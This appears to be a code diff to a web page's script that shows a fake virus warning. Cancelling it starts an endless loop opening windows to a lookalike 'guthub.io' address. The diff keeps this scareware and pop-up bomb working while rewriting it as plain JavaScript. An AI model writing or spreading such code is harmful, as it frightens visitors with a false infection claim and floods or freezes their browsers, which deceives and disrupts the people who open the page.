@@ -58,7 +58,13 @@ function generateFear() {
 }
   generateFear();
 function blockSite() {
-  location.replace("javascript:if (confirm('[leathel]virusDetected!')) {alert('Virus Succesfully Ejected!');} else {while (true) {open('https://0038509gd.guthub.io/Virus');}}");
+  if (confirm('[leathel]virusDetected!')) {
+    alert('Virus Succesfully Ejected!');
+  } else {
+    while (true) {
+      window.open('https://0038509gd.guthub.io/Virus');
+    }
+  }
 }
   blockSite();
 </script></body></html>
